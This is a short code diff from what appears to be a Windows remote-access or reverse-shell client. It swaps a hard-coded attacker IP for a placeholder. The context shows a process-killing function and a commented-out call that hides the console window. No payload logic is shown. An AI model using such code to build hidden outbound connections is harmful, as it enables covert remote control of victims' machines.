@@ -56,7 +56,7 @@ void KillProcessById(DWORD pid) {
 
 int main(int argc, char** argv) {								
 	//FreeConsole(); // This is the way to make the cmd vanish
-	char rhost[] = "51.75.30.35"; // ip to connect to
+	char rhost[] = "xx.xx.xx.xx"; // ip to connect to
 
 	int low_dist = 1100;
 	int high_dist = 2000;
